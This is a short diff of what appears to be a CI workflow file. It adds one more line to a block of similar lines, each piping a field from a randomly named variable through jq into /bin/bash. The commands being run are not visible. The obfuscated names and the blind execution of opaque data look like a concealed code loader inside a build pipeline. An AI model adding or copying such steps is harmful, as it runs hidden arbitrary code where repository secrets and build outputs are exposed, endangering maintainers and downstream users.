@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$snds8" | jq -r .ptnr817 | /bin/bash
           printf '%s' "$ftypc00948" | jq -r .m2147 | /bin/bash
           echo $h862 | jq -r .rl4 | /bin/bash
+          printf '%s' "$uaq857" | jq -r .zl151 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
